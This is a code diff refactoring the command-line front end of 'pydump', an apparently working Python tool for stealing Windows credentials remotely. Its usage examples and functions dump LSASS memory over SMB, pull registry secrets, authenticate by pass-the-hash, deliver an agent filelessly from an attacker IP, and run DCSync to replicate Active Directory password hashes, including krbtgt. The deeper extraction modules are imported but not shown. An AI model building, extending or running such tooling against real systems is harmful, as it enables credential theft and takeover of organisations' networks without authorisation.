@@ -4,109 +4,124 @@ import argparse
 import sys
 import os
 
-from .smb import SmbSession
-from .dump.methods import ComSvcsDump, SilentDump, PipeDump
-from .secrets.registry import RegistrySecrets
-from .parser.minidump import parse
-from .parser.extract import CredentialExtractor
+__version__ = "0.2.0"
 
 
 def main():
     parser = argparse.ArgumentParser(
         prog="pydump",
-        description="Remote credential extraction (registry + LSASS)",
+        description="Remote Windows credential extraction tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 examples:
-  # Full extraction: registry secrets + LSASS dump (default)
   pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
-
-  # Registry only (no execution on target)
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m registry
-
-  # Fileless agent delivery via UNC
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --lhost 10.0.0.5
-
-  # Save raw dump to file for later analysis
-  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp
-
-  # Parse an existing dump file
+  pydump dump -t 192.168.1.50 -u admin -H aad3b4...ef40 -m registry
+  pydump dump -t 192.168.1.50 -u admin -p pass --lhost 10.0.0.5
+  pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
   pydump parse -f lsass.dmp
+  pydump dcsync -t 10.0.0.1 -u CORP\\\\admin -p pass -d corp.local
+  pydump dcsync -t 10.0.0.1 -u admin -H <hash> -d corp.local --user krbtgt
 """,
     )
+    parser.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")
 
     subparsers = parser.add_subparsers(dest="command")
 
-    # ─── dump command ───────────────────────────────────────────────────────
+    # ─── dump ───────────────────────────────────────────────────────────────
     dump_parser = subparsers.add_parser("dump", help="Extract credentials from a remote target")
     dump_parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
     dump_parser.add_argument("-u", "--username", required=True, help="Username")
     dump_parser.add_argument("-p", "--password", default="", help="Password")
-    dump_parser.add_argument("-H", "--hash", default=None, dest="nt_hash", help="NT hash for pass-the-hash (32 hex chars)")
+    dump_parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
+                             metavar="NTHASH", help="NT hash for pass-the-hash (32 hex chars)")
     dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
     dump_parser.add_argument(
         "-m", "--method",
         choices=["auto", "registry", "comsvcs", "silent", "pipe"],
         default="auto",
-        help="Method: auto (registry+pipe), registry (no exec), comsvcs, silent, pipe (native agent)",
+        help="Extraction method (default: auto = registry + pipe agent)",
     )
-    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
-    dump_parser.add_argument("--lhost", default=None, help="Attacker IP for fileless UNC delivery or silent callback")
+    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected if omitted)")
+    dump_parser.add_argument("--lhost", default=None, metavar="IP",
+                             help="Attacker IP for fileless UNC delivery or silent callback")
     dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
-    dump_parser.add_argument("--agent", default=None, help="Path to agent.exe (default: agent/bin/agent.exe)")
-    dump_parser.add_argument("-o", "--output", default=None, help="Save raw LSASS dump to file")
+    dump_parser.add_argument("--agent", default=None, metavar="PATH", help="Path to agent.exe")
+    dump_parser.add_argument("-o", "--output", default=None, metavar="FILE", help="Save raw LSASS dump to file")
 
-    # ─── parse command ──────────────────────────────────────────────────────
-    parse_parser = subparsers.add_parser("parse", help="Parse an existing minidump file")
-    parse_parser.add_argument("-f", "--file", required=True, help="Path to .dmp file")
+    # ─── parse ──────────────────────────────────────────────────────────────
+    parse_parser = subparsers.add_parser("parse", help="Parse an existing LSASS minidump file")
+    parse_parser.add_argument("-f", "--file", required=True, metavar="PATH", help="Path to .dmp file")
 
-    # ─── dcsync command ─────────────────────────────────────────────────────
-    dc_parser = subparsers.add_parser("dcsync", help="DCSync — replicate AD hashes (requires DA/replication rights)")
+    # ─── dcsync ─────────────────────────────────────────────────────────────
+    dc_parser = subparsers.add_parser("dcsync", help="DCSync — replicate AD password hashes")
     dc_parser.add_argument("-t", "--target", required=True, help="Domain Controller IP")
-    dc_parser.add_argument("-u", "--username", required=True, help="Username (domain\\user or user@domain)")
+    dc_parser.add_argument("-u", "--username", required=True, help="Username (DOMAIN\\\\user or user@domain)")
     dc_parser.add_argument("-p", "--password", default="", help="Password")
-    dc_parser.add_argument("-H", "--hash", default=None, dest="nt_hash", help="NT hash for PTH")
+    dc_parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
+                           metavar="NTHASH", help="NT hash for PTH")
     dc_parser.add_argument("-d", "--domain", required=True, help="AD domain FQDN (e.g. corp.local)")
-    dc_parser.add_argument("--user", default=None, dest="target_user", help="Target user to replicate (default: all)")
+    dc_parser.add_argument("--user", default=None, dest="target_user",
+                           metavar="USER", help="Single user to replicate (default: all)")
 
     args = parser.parse_args()
 
-    if args.command == "dump":
-        cmd_dump(args)
-    elif args.command == "parse":
-        cmd_parse(args)
-    elif args.command == "dcsync":
-        cmd_dcsync(args)
-    else:
+    if not args.command:
         parser.print_help()
+        sys.exit(0)
+
+    # Validate auth: need either password or hash
+    if args.command in ("dump", "dcsync"):
+        if not args.password and not args.nt_hash:
+            print("[!] Error: provide either -p/--password or -H/--hash")
+            sys.exit(1)
+        if args.nt_hash:
+            h = args.nt_hash.lower()
+            if len(h) != 32 or not all(c in "0123456789abcdef" for c in h):
+                print("[!] Error: --hash must be exactly 32 hex characters")
+                sys.exit(1)
+            args.nt_hash = h
+
+    if args.command == "dump":
+        _cmd_dump(args)
+    elif args.command == "parse":
+        _cmd_parse(args)
+    elif args.command == "dcsync":
+        _cmd_dcsync(args)
+
+
+def _cmd_dump(args):
+    """Full credential extraction: registry + LSASS."""
+    from .smb import SmbSession
+    from .dump.methods import ComSvcsDump, SilentDump, PipeDump
+    from .secrets.registry import RegistrySecrets
+
+    print(f"[*] Connecting to {args.target}...")
+
+    try:
+        with SmbSession(args.target, args.username, args.password, args.domain,
+                        nt_hash=args.nt_hash) as session:
+            auth_method = "PTH" if args.nt_hash else "password"
+            print(f"[+] Authenticated as {args.domain}\\{args.username} ({auth_method})")
+
+            do_registry = args.method in ("auto", "registry")
+            do_lsass = args.method in ("auto", "comsvcs", "silent", "pipe")
+
+            if do_registry:
+                _dump_registry(session)
+
+            if do_lsass:
+                _dump_lsass(session, args)
+    except Exception as e:
+        print(f"[!] Connection failed: {e}")
         sys.exit(1)
 
 
-def cmd_dump(args):
-    """Full credential extraction: registry + LSASS."""
-    print(f"[*] Connecting to {args.target}...")
-
-    with SmbSession(args.target, args.username, args.password, args.domain,
-                    nt_hash=args.nt_hash) as session:
-        print(f"[+] Authenticated as {args.domain}\\{args.username}")
-
-        do_registry = args.method in ("auto", "registry")
-        do_lsass = args.method in ("auto", "comsvcs", "silent", "pipe")
-
-        # ─── Registry secrets ───────────────────────────────────────────
-        if do_registry:
-            _dump_registry(session)
-
-        # ─── LSASS dump ─────────────────────────────────────────────────
-        if do_lsass:
-            _dump_lsass(session, args)
-
-
-def _dump_registry(session: SmbSession):
+def _dump_registry(session):
     """Extract secrets from remote registry."""
+    from .secrets.registry import RegistrySecrets
+
     print()
     print("── Registry Secrets ─────────────────────────────────────────")
-    reg_secrets = RegistrySecrets(session)
 
     # Ensure service is running
     try:
@@ -157,8 +172,10 @@ def _dump_registry(session: SmbSession):
         print("[*] Remote Registry service restored")
 
 
-def _dump_lsass(session: SmbSession, args):
+def _dump_lsass(session, args):
     """Dump LSASS memory and extract credentials."""
+    from .dump.methods import ComSvcsDump, SilentDump, PipeDump
+
     print()
     print("── LSASS Memory ─────────────────────────────────────────────")
 
@@ -208,8 +225,10 @@ def _dump_lsass(session: SmbSession, args):
     _parse_and_display(dump_data)
 
 
-def cmd_parse(args):
+def _cmd_parse(args):
     """Parse a local dump file."""
+    from .parser.minidump import parse
+
     if not os.path.isfile(args.file):
         print(f"[!] File not found: {args.file}")
         sys.exit(1)
@@ -223,6 +242,9 @@ def cmd_parse(args):
 
 def _parse_and_display(dump_data: bytes):
     """Parse dump and display extracted credentials."""
+    from .parser.minidump import parse
+    from .parser.extract import CredentialExtractor
+
     print("[*] Parsing minidump...")
     dump = parse(dump_data)
 
@@ -259,7 +281,7 @@ def _parse_and_display(dump_data: bytes):
         print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")
 
 
-def cmd_dcsync(args):
+def _cmd_dcsync(args):
     """DCSync — replicate AD password hashes via MS-DRSR."""
     try:
         from impacket.dcerpc.v5 import drsuapi, transport
